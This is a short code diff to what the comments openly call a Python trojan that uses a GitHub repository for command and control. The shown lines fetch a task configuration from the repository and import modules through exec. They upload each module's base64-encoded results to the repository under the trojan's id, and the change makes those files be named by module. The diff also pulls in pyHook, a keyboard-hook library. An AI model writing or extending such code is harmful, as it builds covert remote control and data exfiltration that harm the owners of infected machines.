@@ -71,9 +71,9 @@ def get_trojan_config():
             exec("import %s" % task['module'])#do the import
     return config#retrun the config content
 
-def store_module_result(data):#storing module resaults in data section
+def store_module_result(data,module):#storing module resaults in data section
     gh,repo,branch = connect_to_github()#connect to github
-    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
+    remote_path = "data/%s/%s.data" % (trojan_id,module)
     #store it in a file called like your trojan id in github repository
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
     #repo action for github create file in repo
@@ -116,7 +116,7 @@ def module_runner(module):
     #(every module is surrounded by a run function that takes any given number of arguments)
     task_queue.get()#get the task que
     #store the resualt in our repo
-    store_module_result(result)#store the module resualt
+    store_module_result(result,module)#store the module resualt
     return#end function
     # main trojan loop
 get_wheel("pyHook")
